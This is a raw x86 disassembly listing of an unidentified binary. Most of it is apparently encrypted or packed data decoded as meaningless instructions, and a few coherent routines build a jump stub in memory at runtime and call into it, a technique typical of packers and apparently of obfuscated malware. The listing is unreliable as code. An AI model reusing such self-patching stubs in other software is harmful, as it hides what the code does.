  4100cf:	rcr    DWORD PTR [edi],cl
  4100d1:	xchg   ebx,eax
  4100d2:	and    cl,BYTE PTR [esi-0xb3823d2]
  4100d8:	inc    eax
  4100d9:	pop    edx
  4100da:	aad    0x7f
  4100dc:	xor    BYTE PTR [edx],ah
  4100de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100df:	push   ss
  4100e0:	shr    BYTE PTR ds:0x69d3d466,0xe8
  4100e7:	(bad)  
  4100e8:	sub    DWORD PTR [ecx],ecx
  4100ea:	jl     0x4100f9
  4100ec:	mov    ah,0x4a
  4100ee:	loop   0x41008b
  4100f0:	loope  0x410171
  4100f2:	mov    esp,DWORD PTR [edx-0x2385ddf2]
  4100f8:	daa    
  4100f9:	cmp    bl,al
  4100fb:	fcmovu st,st(3)
  4100fd:	(bad)  
  4100fe:	dec    ebx
  4100ff:	jb     0x4100d1
  410101:	test   ebp,edx
  410103:	cld    
  410104:	and    al,0xee
  410106:	je     0x4100bc
  410108:	or     ecx,DWORD PTR cs:[ebp-0x41]
  41010c:	jo     0x410101
  41010e:	cmc    
  41010f:	jo     0x410151
  410111:	and    DWORD PTR [esi+0x64],edi
  410114:	xchg   esp,eax
  410115:	and    DWORD PTR [esi-0x40d8fbcf],esi
  41011b:	xor    eax,0x95a72fe8
  410120:	or     DWORD PTR [esi],edx
  410122:	and    ecx,DWORD PTR [eax+0x61]
  410125:	lds    esi,FWORD PTR [esi+0x42]
  410128:	sahf   
  410129:	sti    
  41012a:	out    0x5f,al
  41012c:	push   0xffffffaa
  41012e:	gs xchg esi,eax
  410130:	mov    ah,0xce
  410132:	call   0xcb520875
  410137:	std    
  410138:	push   esp
  410139:	int3   
  41013a:	mov    ch,0x3c
  41013c:	lods   al,BYTE PTR ds:[esi]
  41013d:	dec    edi
  41013e:	fwait
  41013f:	xor    eax,0x801eed2a
  410144:	out    0xca,al
  410146:	call   DWORD PTR [eax+0x18d6a3f6]
  41014c:	push   edx
  41014d:	mov    eax,ds:0x571fec62
  410152:	mov    bl,0x89
  410154:	in     eax,dx
  410155:	dec    esp
  410156:	cmp    al,0x4
  410158:	add    al,0xa1
  41015a:	xor    bl,0x20
  41015d:	test   eax,0x980255be
  410162:	mov    esi,0x38a097e
  410167:	sbb    al,0x6
  410169:	sbb    DWORD PTR [edi],ebx
  41016b:	inc    ecx
  41016c:	js     0x410116
  41016e:	xchg   BYTE PTR [eax+0x28],bh
  410171:	jl     0x4100f4
  410173:	in     eax,dx
  410174:	mov    BYTE PTR [edi],bl
  410176:	in     al,dx
  410177:	aam    0x90
  410179:	or     ecx,DWORD PTR [edi+0x292012af]
  41017f:	dec    edi
  410180:	inc    edi
  410181:	repz xor al,0xa9
  410184:	fstp   DWORD PTR [eax+0x54f52bb8]
  41018a:	stos   BYTE PTR es:[edi],al
  41018b:	fabs   
  41018d:	ret    0x4fac
  410190:	sub    eax,eax
  410192:	jmp    0x8ac39e91
  410197:	mov    eax,0x579637c8
  41019c:	into   
  41019d:	(bad)  
  41019e:	stos   BYTE PTR es:[edi],al
  41019f:	loopne 0x41018d
  4101a1:	aaa    
  4101a2:	inc    ecx
  4101a3:	aam    0xa9
  4101a5:	hlt    
  4101a6:	add    BYTE PTR [ecx],0x99
  4101a9:	(bad)  [esi-0x7c]
  4101ac:	mov    ecx,0xb5c9bd5e
  4101b1:	idiv   bh
  4101b3:	jg     0x410171
  4101b5:	xor    BYTE PTR [esp+eax*2],bh
  4101b8:	(bad)  
  4101b9:	sbb    eax,0x2d76babe
  4101be:	out    dx,al
  4101bf:	add    ebx,0xfffffff7
  4101c2:	retf   
  4101c3:	xor    ebp,DWORD PTR [eax-0x19968a84]
  4101c9:	jae    0x410237
  4101cb:	push   es
  4101cc:	jmp    0x5fb2:0xf496e2
  4101d3:	stos   DWORD PTR es:[edi],eax
  4101d4:	cli    
  4101d5:	sbb    al,0x1f
  4101d7:	leave  
  4101d8:	mov    ?,ecx
  4101da:	pop    edi
  4101db:	sub    edi,DWORD PTR [esi-0x425f7561]
  4101e1:	cmp    BYTE PTR [ebx],dl
  4101e3:	mov    esp,0x6998a929
  4101e8:	mov    cl,0x84
  4101ea:	push   esp
  4101eb:	ins    BYTE PTR es:[edi],dx
  4101ec:	ss jle 0x4101dc
  4101ef:	push   0xcb7330d5
  4101f4:	lock aam 0x20
  4101f7:	mov    BYTE PTR [edi],cl
  4101f9:	jecxz  0x41018f
  4101fb:	or     BYTE PTR [esi+edi*2+0x61f53745],al
  410202:	popa   
  410203:	sahf   
  410204:	inc    ecx
  410205:	pop    edi
  410206:	inc    ebp
  410207:	adc    ch,ah
  410209:	add    BYTE PTR [esi+0x58],cl
  41020c:	loop   0x4101f6
  41020e:	inc    esi
  41020f:	iret   
  410210:	adc    cl,al
  410212:	xchg   ecx,eax
  410213:	adc    eax,0x831f22f3
  410218:	adc    edi,DWORD PTR [edx-0x46]
  41021b:	jnp    0x41020a
  41021d:	std    
  41021e:	mov    eax,ds:0x34fcd45a
  410224:	jne    0x41065f
  41022a:	mov    ecx,DWORD PTR [ebp-0x78]
  41022d:	xor    edx,edx
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422548
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422548
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422650
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422648],eax
  4102bc:	inc    DWORD PTR ds:0x422650
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	pop    edi
  41030d:	call   0x1818:0x92c370cf
  410314:	mov    esi,0x66181814
  410319:	push   ebx
  41031a:	stc    
  41031b:	xor    bh,cl
  41031d:	(bad)  
  41031e:	icebp  
  41031f:	or     bh,BYTE PTR [ecx-0x17bdb6b]
  410325:	cmp    eax,0x43222b42
  41032a:	xlat   BYTE PTR ds:[ebx]
  41032b:	xor    BYTE PTR [esi-0xb62dfd1],ah
  410331:	mov    ds:0xf1422957,al
  410336:	sar    DWORD PTR ds:0xba8ec89b,0x26
  41033d:	bound  ecx,QWORD PTR [edx]
  41033f:	shr    BYTE PTR [edi+0x48],1
  410342:	add    ebp,ebx
  410344:	cmp    al,0xdc
  410346:	mov    al,0x4e
  410348:	inc    ecx
  410349:	jb     0x4103b8
  41034b:	imul   BYTE PTR [edx+0x5840d106]
  410351:	mov    BYTE PTR [ebp+0x41a3fc0d],ah
  410357:	push   ebp
  410358:	mov    dl,0xf
  41035a:	and    esi,ebx
  41035c:	adc    ecx,DWORD PTR [ecx+edx*8-0x7eda409e]
  410363:	aaa    
  410364:	test   BYTE PTR fs:[ebx+0x2a5c15c9],dl
  41036b:	jnp    0x410370
  41036d:	or     DWORD PTR [edx],edi
  41036f:	mov    esi,0xc938bf3b
  410374:	mov    ds:0x8cd20af5,al
  410379:	aam    0x39
  41037b:	or     al,dl
  41037d:	retf   0x4505
  410380:	ret    0x3303
  410383:	cmp    cl,bl
  410385:	stos   BYTE PTR es:[edi],al
  410386:	adc    bh,al
  410388:	adc    dl,BYTE PTR [esp+ebp*4+0x36a2de3a]
  41038f:	or     eax,0x9191bda7
  410394:	add    bl,BYTE PTR [ebx+0x5491d316]
  41039a:	xor    al,0x27
  41039c:	adc    DWORD PTR [ebx],esp
  41039e:	and    DWORD PTR ds:0x34fcad47,esp
  4103a4:	xrelease xchg BYTE PTR [ecx],cl
  4103a7:	push   ds
  4103a8:	cwde   
  4103a9:	lds    ebp,FWORD PTR gs:[edx+0x49]
  4103ad:	addr16 mov ecx,0xd3454c78
  4103b3:	inc    ecx
  4103b4:	ret    0x1ea4
  4103b7:	sbb    eax,0x5641e829
  4103bc:	in     eax,dx
  4103bd:	test   bl,0x97
  4103c0:	gs jge 0x4103fa
  4103c3:	hlt    
  4103c4:	pop    ds
  4103c5:	cli    
  4103c6:	cli    
  4103c7:	xlat   BYTE PTR ds:[ebx]
  4103c8:	xor    eax,0x3f19282
  4103cd:	sub    eax,0x6f22bf1f
  4103d2:	inc    ebx
  4103d3:	out    dx,al
  4103d4:	out    0xb3,eax
  4103d6:	int3   
  4103d7:	iret   
  4103d8:	mov    edx,fs
  4103da:	ins    DWORD PTR es:[edi],dx
  4103db:	mov    esi,fs
  4103dd:	outs   dx,DWORD PTR ds:[esi]
  4103de:	adc    BYTE PTR [edi-0x4],bl
  4103e1:	repz mov eax,ds:0x11fa5607
  4103e7:	cmc    
  4103e8:	mov    eax,ds:0x4bf73726
  4103ed:	and    al,0xe1
  4103ef:	ins    DWORD PTR es:[edi],dx
  4103f0:	lock adc ebp,eax
  4103f3:	ret    0xfd36
  4103f6:	mov    bl,0x20
  4103f8:	bnd jg 0x41038a
  4103fb:	sahf   
  4103fc:	bound  edx,QWORD PTR [ebx]
  4103fe:	push   ebx
  4103ff:	mov    edx,DWORD PTR [ecx+0x75]
  410402:	cs pop edx
  410404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410405:	sbb    BYTE PTR [edx],cl
  410407:	push   es
  410408:	inc    ecx
  410409:	test   BYTE PTR [ebp-0x1112e4dc],0xd
  410410:	cmp    ecx,DWORD PTR [eax+0x7393e0ed]
  410416:	mov    al,0x97
  410418:	push   0xd8e307b8
  41041d:	arpl   WORD PTR [eax],dx
  41041f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410420:	retf   
  410421:	jae    0x410418
  410423:	sbb    DWORD PTR [eax+0x11],edi
  410426:	ins    DWORD PTR es:[edi],dx
  410427:	arpl   cx,ax
  410429:	xchg   esi,eax
  41042a:	iret   
  41042b:	fisub  WORD PTR [edi-0x73bddc62]
  410431:	jge    0x410420
  410433:	xchg   esi,eax
  410434:	in     eax,dx
  410435:	test   eax,0xc993291a
  41043a:	int    0xfb
  41043c:	stos   BYTE PTR es:[edi],al
  41043d:	push   edx
  41043e:	outs   dx,DWORD PTR ds:[esi]
  41043f:	mov    eax,ds:0xec97e59
  410444:	leave  
  410445:	xchg   DWORD PTR [ebx],eax
  410447:	push   ss
  410448:	adc    ecx,DWORD PTR [ecx]
  41044a:	xor    BYTE PTR [ecx+eax*8-0x235a2a5d],0xaf
  410452:	xor    BYTE PTR [edi-0x15d6466d],0xb1
  410459:	jns    0x4104c0
  41045b:	or     BYTE PTR [edx+0x34],cl
  41045e:	jle    0x4103f0
  410460:	inc    esp
  410461:	cld    
  410462:	add    al,0xd5
  410464:	sbb    bh,BYTE PTR [eax-0x6d]
  410467:	in     eax,dx
  410468:	xor    al,0xbf
  41046a:	sbb    BYTE PTR [edi],ah
  41046c:	gs scas eax,DWORD PTR es:[edi]
  41046e:	jmp    0x4103ff
  410470:	push   esp
  410471:	in     eax,0x1a
  410473:	shr    BYTE PTR [eax+0x73],1
  410476:	sub    eax,0x28eaf852
  41047b:	sbb    BYTE PTR [ebp+0x7e],0xc
  41047f:	or     al,0x80
  410481:	cmp    ecx,DWORD PTR [eax+edx*2]
  410484:	fadd   st(5),st
  410486:	stos   DWORD PTR es:[edi],eax
  410487:	xchg   ebx,eax
  410488:	jecxz  0x4104ec
  41048a:	sub    al,0x1e
  41048c:	retf   
  41048d:	mov    edi,0x991509ab
  410492:	out    dx,al
  410493:	add    al,cl
  410495:	xor    cl,bh
  410497:	push   esi
  410498:	(bad)  
  410499:	cmc    
  41049a:	xor    al,bl
  41049c:	lods   al,BYTE PTR ds:[esi]
  41049d:	and    DWORD PTR [eax],esp
  41049f:	jmp    0x41042b
  4104a1:	icebp  
  4104a2:	jmp    0x4431b686
  4104a7:	out    dx,al
  4104a8:	mov    ebp,0x31e0d6fa
  4104ad:	push   edx
  4104ae:	call   0xcade5948
  4104b3:	sti    
  4104b4:	in     eax,dx
  4104b5:	shl    DWORD PTR [edx+0x40],cl
  4104b8:	pop    esi
  4104b9:	mov    bh,BYTE PTR [ecx+ecx*4+0x54b65472]
  4104c0:	das    
  4104c1:	pop    ss
  4104c2:	repnz cdq 
  4104c4:	push   ecx
  4104c5:	iret   
  4104c6:	pushf  
  4104c7:	xchg   edx,eax
  4104c8:	shl    BYTE PTR [ebp+0x12],0x88
  4104cc:	and    al,0xae
  4104ce:	cmp    DWORD PTR [esp+ecx*4-0x6bb632ad],edx
  4104d5:	xchg   esp,eax
  4104d6:	push   ebp
  4104d7:	imul   eax,DWORD PTR [edx],0xf5d3712e
  4104dd:	xor    eax,0x9bac73bf
  4104e2:	pop    ds
  4104e3:	pop    edi
  4104e4:	leave  
  4104e5:	jecxz  0x410471
  4104e7:	cmp    al,0x17
  4104e9:	imul   esi,DWORD PTR [eax-0x3e],0x1b
  4104ed:	fst    QWORD PTR [esi+0x33ea62f8]
  4104f3:	lea    ebx,[eax+0x1d50411f]
  4104f9:	dec    esp
  4104fa:	out    0x79,eax
  4104fc:	xchg   ecx,eax
  4104fd:	in     eax,dx
  4104fe:	pop    es
  4104ff:	bt     DWORD PTR cs:[edi],esi
  410503:	push   0xffffff85
  410505:	lods   eax,DWORD PTR ds:[esi]
  410506:	adc    DWORD PTR [ebx+0x6ec09a1d],eax
  41050c:	mov    edi,0x748c2dbc
  410511:	fnsave [edx+esi*1+0x4a]
  410515:	jge    0x4104f4
  410517:	loopne 0x4104a0
  410519:	mov    esp,ecx
  41051b:	mov    ecx,0xb66a3cb5
  410520:	repz clc 
  410522:	xor    DWORD PTR [edi],edi
  410524:	in     eax,0x1f
  410526:	leave  
  410527:	xor    esp,DWORD PTR [edx-0x13]
  41052a:	inc    ebp
  41052b:	mov    cl,0x17
  41052d:	sub    cl,ch
  41052f:	xchg   edi,eax
  410530:	inc    edi
  410531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410532:	adc    dl,BYTE PTR [ecx+0x42]
  410535:	ins    DWORD PTR es:[edi],dx
  410536:	fidiv  WORD PTR [edx]
  410538:	push   edx
  410539:	mov    bh,BYTE PTR [ecx-0x7b435376]
  41053f:	sub    al,0xec
  410541:	test   ah,bl
  410543:	mov    ds:0x85dba197,eax
  410548:	mov    ebx,DWORD PTR [edi-0xc]
  41054b:	or     edi,DWORD PTR [ecx-0x69b7f143]
  410551:	fmul   QWORD PTR [edi]
  410553:	push   eax
  410554:	nop    DWORD PTR [esi-0x13ba1b37]
  41055b:	add    al,0xa7
  41055d:	and    al,0x24
  41055f:	jle    0x4105c0
  410561:	ins    BYTE PTR es:[edi],dx
  410562:	sbb    ah,BYTE PTR [eax+0x26]
  410565:	nop
  410566:	pushf  
  410567:	xlat   BYTE PTR ds:[ebx]
  410568:	or     BYTE PTR [ecx],0xc8
  41056b:	ret    
  41056c:	(bad)  
  41056d:	push   DWORD PTR [ebx]
  41056f:	and    dl,BYTE PTR [eax]
  410571:	test   esp,ecx
  410573:	das    
  410574:	and    DWORD PTR [edi+0xd],esi
  410577:	lock mov bh,0x36
  41057a:	repz sbb BYTE PTR [edi-0x76],bl
  41057e:	add    bl,BYTE PTR [edi-0x103c6ac7]
  410584:	pushf  
  410585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410586:	icebp  
  410587:	dec    ecx
  410588:	clc    
  410589:	test   DWORD PTR [edx],0xa3c45bb2
  41058f:	inc    esp
  410590:	xlat   BYTE PTR ds:[ebx]
  410591:	adc    eax,0xd2c39163
  410596:	ss pop edi
  410598:	and    dh,BYTE PTR [ebx]
  41059a:	pop    ds
  41059b:	cli    
  41059c:	(bad)  
  41059d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41059e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41059f:	test   eax,0x5d29d703
  4105a4:	mov    bh,0x63
  4105a6:	cli    
  4105a7:	cmc    
  4105a8:	sbb    bh,BYTE PTR [ebx+0x68d083c0]
  4105ae:	or     eax,0x1bf4556d
  4105b3:	stos   DWORD PTR es:[edi],eax
  4105b4:	in     al,0xb
  4105b6:	cmp    al,0xfe
  4105b8:	jecxz  0x4105a9
  4105ba:	mov    edx,0x6bf37b77
  4105bf:	test   al,0x9f
  4105c1:	add    ebx,ecx
  4105c3:	repnz es xchg esi,eax
  4105c6:	repz dec edx
  4105c8:	jnp    0x410557
  4105ca:	inc    ebp
  4105cb:	lock mov DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223c4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422638
  410612:	push   DWORD PTR ds:0x4223cc
  410618:	push   DWORD PTR ds:0x422618
  41061e:	push   DWORD PTR ds:0x42268c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422548
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	xchg   edx,eax
  4106ed:	bound  esi,QWORD PTR [edi+0x7c]
  4106f0:	push   0x9a18188e
  4106f5:	adc    al,0x18
  4106f7:	sbb    dh,dl
  4106f9:	ss xchg edi,eax
  4106fb:	fidiv  WORD PTR [ecx]
  4106fd:	mov    WORD PTR [esi+0x20],?
  410700:	pop    edi
  410701:	addr16 call 0xd38:0xca12f798
  410709:	fisubr WORD PTR [esi]
  41070b:	repnz push edi
  41070d:	push   ss
  41070e:	ds imul esp,esp,0x39
  410712:	sbb    eax,0xd8eea675
  410717:	rcr    DWORD PTR [esi],0x72
  41071a:	and    ecx,DWORD PTR [edx+0x1a2ecae3]
  410720:	cwde   
  410721:	fld    TBYTE PTR [edi+edx*1]
  410724:	xor    ecx,DWORD PTR ds:0x8f999845
  41072a:	mov    DWORD PTR [ebx],ebx
  41072c:	dec    esp
  41072d:	mov    al,BYTE PTR [edx]
  41072f:	add    BYTE PTR [ecx+0x68b5b8b5],0x82
  410736:	nop
  410737:	(bad)  
  410738:	std    
  410739:	sbb    cl,ah
  41073b:	les    esp,FWORD PTR [edx]
  41073d:	ds push esi
  41073f:	jnp    0x4106f9
  410741:	xor    bh,BYTE PTR [ebp-0x6fdf448]
  410747:	mov    ch,0x47
  410749:	lea    edi,[edi+0x6ddd799f]
  41074f:	cmp    dl,BYTE PTR [eax+0x4b4de322]
  410755:	(bad)  
  410756:	pushf  
  410757:	or     dh,BYTE PTR [ebp-0x6d]
  41075a:	inc    esi
  41075b:	pushf  
  41075c:	test   al,0x96
  41075e:	cmp    esi,DWORD PTR [eax+0x276e3748]
  410764:	mov    ebx,0x3535e5d5
  410769:	mov    ebp,0x8fe1f772
  41076e:	adc    DWORD PTR [ebx-0x7a5e2ee7],ebp
  410774:	retf   0x6a10
  410777:	retf   0xc9e1
  41077a:	pop    eax
  41077b:	fistp  WORD PTR [edx]
  41077d:	out    dx,al
  41077e:	mov    edi,0x76e2dddc
  410783:	mov    dl,0x3d
  410785:	(bad)  
  410786:	and    dh,bl
  410788:	ficom  WORD PTR [esi-0x2d]
  41078b:	mov    dl,dh
  41078d:	ins    BYTE PTR es:[edi],dx
  41078e:	or     al,0xe2
  410790:	mov    ecx,0x65afa3d4
  410795:	xchg   ebx,eax
  410796:	cs jne 0x410763
  410799:	xor    esp,DWORD PTR [edx-0x3609ff49]
  41079f:	ins    DWORD PTR es:[edi],dx
  4107a0:	and    eax,0xf833b2be
  4107a5:	in     al,dx
  4107a6:	dec    ebx
  4107a7:	out    0xc6,al
  4107a9:	pop    ss
  4107aa:	enter  0xa9fd,0xfc
  4107ae:	test   al,0x7d
  4107b0:	sub    DWORD PTR [eax+0x481198a9],esi
  4107b6:	fcom   QWORD PTR [edx]
  4107b8:	lock push esp
  4107ba:	jns    0x4107ef
  4107bc:	xor    ecx,esi
  4107be:	mov    eax,0x213310dd
  4107c3:	dec    eax
  4107c4:	xor    ecx,DWORD PTR [edx]
  4107c6:	ins    DWORD PTR es:[edi],dx
  4107c7:	call   0x21f4:0x2700b24d
  4107ce:	pop    edi
  4107cf:	test   BYTE PTR [ecx-0x3d],bh
  4107d2:	cmp    al,0x99
  4107d4:	fmul   st(3),st
  4107d6:	mov    esi,0xa963351a
  4107db:	mov    al,0x2a
  4107dd:	out    dx,eax
  4107de:	xor    al,0xec
  4107e0:	or     BYTE PTR [eax+edi*4+0x64],al
  4107e4:	cmp    ebx,DWORD PTR [edx+edi*4]
  4107e7:	dec    esp
  4107e8:	lea    edi,[edx-0x68]
  4107eb:	mov    bl,0xcd
  4107ed:	or     ah,BYTE PTR [esi-0x50da8eb1]
  4107f3:	call   0xf5b3:0x23af159c
  4107fa:	push   esi
  4107fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107fd:	mov    ebx,0xe66c78db
  410802:	lea    eax,[ebp-0x6e76e8b0]
  410808:	fild   DWORD PTR [ebp+edi*8+0x31]
  41080c:	adc    al,0x54
  41080e:	mov    bl,bh
  410810:	shl    DWORD PTR [ecx+ecx*4+0x620264d4],cl
  410817:	idiv   BYTE PTR [eax]
  410819:	mov    ebp,0x5b93d6b8
  41081e:	mov    al,ds:0x6f5cf8
  410823:	nop
  410824:	mov    ebp,0xbec6beac
  410829:	loopne 0x4107c7
  41082b:	mov    al,ds:0x6fa3f9b4
  410830:	xchg   ebx,eax
  410831:	int    0x35
  410833:	add    edi,DWORD PTR [eax]
  410835:	(bad)  
  410836:	lods   eax,DWORD PTR ds:[esi]
  410837:	mov    eax,ds
  410839:	pop    ss
  41083a:	int    0x9
  41083c:	inc    ecx
  41083d:	xchg   ecx,eax
  41083e:	fsubr  DWORD PTR [ebp-0x305f5971]
  410844:	mov    dl,0xe6
  410846:	xor    BYTE PTR ds:0x64250a1a,bl
  41084c:	dec    ebp
  41084d:	rcl    BYTE PTR [esi-0x6b349a71],cl
  410853:	nop
  410854:	push   esp
  410855:	xchg   edx,eax
  410856:	pop    ecx
  410857:	and    bl,cl
  410859:	cmp    al,0x47
  41085b:	dec    edi
  41085c:	cmp    al,0xab
  41085e:	imul   ebp,DWORD PTR ds:0xd1d77f3b,0x12e012a9
  410868:	mov    ds:0xa064e88c,eax
  41086d:	stos   BYTE PTR es:[edi],al
  41086e:	xor    eax,0x7b7aca2
  410873:	pushw  ss
  410875:	dec    ebx
  410876:	push   esp
  410877:	pop    edx
  410878:	adc    al,0x86
  41087a:	xor    BYTE PTR [esi+0x2a],dh
  41087d:	mov    bh,0x8c
  41087f:	jg     0x410852
  410881:	jne    0x41080a
  410883:	mov    al,ds:0xa473fe8c
  410888:	pop    esi
  410889:	fnstenv [esi+0x42]
  41088c:	out    0xd8,eax
  41088e:	in     eax,dx
  41088f:	cmp    DWORD PTR [ecx-0x1a],edi
  410892:	nop
  410893:	push   ebx
  410894:	dec    esp
  410895:	lock aam 0x6e
  410898:	jne    0x4108ca
  41089a:	sbb    DWORD PTR [edx-0x4d],edx
  41089d:	push   esp
  41089e:	and    edx,DWORD PTR [ebx+0x7b]
  4108a1:	rcl    BYTE PTR [esi+0x27ae838],1
  4108a7:	fisttp DWORD PTR [esi+0x15]
  4108aa:	mov    al,0xaa
  4108ac:	aas    
  4108ad:	outs   dx,BYTE PTR ds:[esi]
  4108ae:	in     eax,dx
  4108af:	jmp    0x95a5:0x51685da9
  4108b6:	data16 (bad) [ebx+0x52]
  4108ba:	out    dx,eax
  4108bb:	and    ebp,eax
  4108bd:	pop    esi
  4108be:	(bad)
  4108c1:	test   eax,0x815bf835
  4108c6:	push   ecx
  4108c7:	clc    
  4108c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108c9:	je     0x410919
  4108cb:	das    
  4108cc:	add    bl,BYTE PTR [esi]
  4108ce:	and    DWORD PTR [edi-0x19c4a194],eax
  4108d4:	inc    ebx
  4108d5:	xchg   ebx,eax
  4108d6:	icebp  
  4108d7:	xchg   edx,eax
  4108d8:	pop    esp
  4108d9:	fcmovnb st,st(1)
  4108db:	daa    
  4108dc:	jo     0x4108d7
  4108de:	add    BYTE PTR [edi+0x7d207718],bl
  4108e4:	leave  
  4108e5:	jecxz  0x41095f
  4108e7:	aad    0x87
  4108e9:	call   0x9c13dc2c
  4108ee:	or     al,BYTE PTR [edi]
  4108f0:	jecxz  0x410905
  4108f2:	mov    ecx,0xe16a2efd
  4108f7:	bound  eax,QWORD PTR [edi]
  4108f9:	pop    ebp
  4108fa:	sub    DWORD PTR [edx],eax
  4108fc:	sub    DWORD PTR [ecx],ebx
  4108fe:	fcomp  DWORD PTR [ebx+ecx*2]
  410901:	pop    esp
  410902:	clc    
  410903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410904:	lods   eax,DWORD PTR ds:[esi]
  410905:	xor    bh,bh
  410907:	repz jno 0x410963
  41090a:	and    al,0x84
  41090c:	addr16 faddp st(7),st
  41090f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410910:	int    0xf3
  410912:	jnp    0x41098a
  410914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
